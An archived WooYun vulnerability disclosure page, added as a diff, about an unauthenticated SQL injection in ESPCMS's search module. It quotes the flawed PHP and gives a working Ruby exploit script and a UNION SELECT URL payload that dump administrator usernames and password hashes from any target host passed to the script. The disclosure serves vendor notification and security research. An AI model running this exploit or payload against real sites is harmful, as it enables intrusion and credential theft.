@@ -1,0 +1,266 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		开源程序espcms搜索处存SQL注入漏洞,可得到管理员密码  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		开源程序espcms搜索处存SQL注入漏洞,可得到管理员密码  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪头子">猪头子</a> 
+</li><li>提交时间：		2013-06-25 14:30</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-25：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-06-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-06-28：	细节向第三方安全合作伙伴开放<br/>
+									2013-07-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-15：	细节向普通白帽子公开<br/>
+									2013-08-04：	细节向实习白帽子公开<br/>
+									2013-09-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">无需认证，直接爆数据</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">和wap模块下的SQL注入原理一样，都是从$_SERVER[&#039;QUERY_STRING&#039;]中去取变量导致绕过过滤的情况。<br />
+<br />
+<br />
+<br />
+在/interface/search.php文件的in_result函数中:<br />
+<br />
+</p><pre><code>function in_result() {<br />
+            ... ... ... ... ... ... ... ... ...<br />
+            $urlcode = $_SERVER[ &#039;QUERY_STRING &#039;];<br />
+            parse_str(html_entity_decode($urlcode), $output);<br />
+<br />
+            ... ... ... ... ... ... ... ... ...<br />
+            if (is_array($output[&#039;attr&#039; ]) &amp;&amp; count($output[&#039;attr&#039;]) &gt; 0) {<br />
+<br />
+                  $db_table = db_prefix . &#039;model_att&#039;;<br />
+<br />
+                   foreach ($output[&#039;attr&#039; ] as $key =&gt; $value) {<br />
+                         if ($value) {<br />
+<br />
+                              $key = addslashes($key);<br />
+                              $key = $this-&gt; fun-&gt;inputcodetrim($key);<br />
+                              $db_att_where = &quot; WHERE isclass=1 AND attrname=&#039;$key&#039;&quot;;<br />
+                              $countnum = $this-&gt;db_numrows($db_table, $db_att_where);<br />
+                               if ($countnum &gt; 0) {<br />
+                                    $db_where .= &#039; AND b.&#039; . $key . &#039;=\&#039;&#039; . $value . &#039;\&#039;&#039; ;<br />
+                              }<br />
+                        }<br />
+                  }<br />
+            }<br />
+            if (!empty ($keyword) &amp;&amp; empty($keyname)) {<br />
+                  $keyname = &#039;title&#039;;<br />
+                  $db_where.= &quot; AND a.title like &#039;%$keyword%&#039;&quot; ;<br />
+            } elseif (!empty ($keyword) &amp;&amp; !empty($keyname)) {<br />
+                  $db_where.= &quot; AND $keyname like &#039;% $keyword%&#039;&quot;;<br />
+            }<br />
+            $pagemax = 15;<br />
+<br />
+            $pagesylte = 1;<br />
+<br />
+             if ($countnum &gt; 0) {<br />
+<br />
+                  $numpage = ceil($countnum / $pagemax);<br />
+            } else {<br />
+                  $numpage = 1;<br />
+            }<br />
+            $sql = &quot;SELECT b.*,a.* FROM &quot; . db_prefix . &quot;document AS a LEFT JOIN &quot; . db_prefix . &quot;document_attr AS b ON a.did=b.did &quot; . $db_where . &#039; LIMIT 0,&#039; . $pagemax;<br />
+            $this-&gt; htmlpage = new PageBotton($sql, $pagemax, $page, $countnum, $numpage, $pagesylte, $this-&gt;CON [&#039;file_fileex&#039; ], 5, $this-&gt;lng[&#039;pagebotton&#039; ], $this-&gt;lng[&#039;gopageurl&#039;], 0);<br />
+            $sql = $this-&gt; htmlpage-&gt;PageSQL(&#039;a.did&#039; , &#039;down&#039; );<br />
+            $rs = $this-&gt;db-&gt;query($sql);<br />
+            ... ... ... ... ... ... ... ... ...<br />
+      }</code></pre><p class='detail'><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">PoC：<br />
+<br />
+</p><pre><code>require &quot;net/http&quot;<br />
+require &quot;uri&quot;<br />
+<br />
+def request(method, url)<br />
+     if method.eql?(&quot;get&quot;)<br />
+          uri = URI.parse(url)<br />
+          http = Net::HTTP.new(uri.host, uri.port)<br />
+          response = http.request(Net::HTTP::Get.new(uri.request_uri))<br />
+          return response<br />
+     end<br />
+end<br />
+<br />
+doc =&lt;&lt;HERE<br />
+-------------------------------------------------------<br />
+Espcms Inejction Exploit<br />
+Author:ztz<br />
+Blog:http://ztz.fuzzexp.org/<br />
+-------------------------------------------------------<br />
+<br />
+HERE<br />
+<br />
+usage =&lt;&lt;HERE<br />
+Usage:           ruby #{$0} host port path<br />
+example:      ruby #{$0} www.target.com 80 /<br />
+HERE<br />
+<br />
+puts doc<br />
+if ARGV.length &lt; 3<br />
+     puts usage<br />
+else<br />
+     $host = ARGV[0]<br />
+     $port = ARGV[1]<br />
+     $path = ARGV[2]<br />
+<br />
+     puts &quot;[*]send request...&quot;<br />
+     url = &quot;http://#{$host}:#{$port}#{$path}index.php?ac=search&amp;at=result&amp;lng=cn&amp;mid=3&amp;tid=11&amp;keyword=1&amp;keyname=a.title&amp;countnum=1&amp;attr[jobnum]=1%27%20and%201=2%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,concat%28username,CHAR%2838%29,password%29,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45%20from%20espcms_admin_member;%23&quot;<br />
+     response = request(&quot;get&quot;, url)<br />
+     result = response.body.scan(/\w+&amp;\w{32}/)<br />
+     puts result<br />
+end</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>index.php?ac=search&amp;at=result&amp;lng=cn&amp;mid=3&amp;tid=11&amp;keyword=1&amp;keyname=a.title&amp;countnum=1&amp;attr[jobnum]=1%27%20and%201=2%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,concat%28username,CHAR%2838%29,password%29,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45%20from%20espcms_admin_member;%23</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/25140253ddf65b5fbbb27cda418095a3fda8a1e3.jpg" target="_blank"><img src="../images/25140253ddf65b5fbbb27cda418095a3fda8a1e3.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/2514030350d6e9bf5576260272639d131063c47f.jpg" target="_blank"><img src="../images/2514030350d6e9bf5576260272639d131063c47f.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">把过滤点放到mysql_query入口，而不是程序入口 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪头子" title="猪头子">猪头子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-026861" title="开源程序espcms搜索处存SQL注入漏洞,可得到管理员密码">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-06-25 18:14</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="26861";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
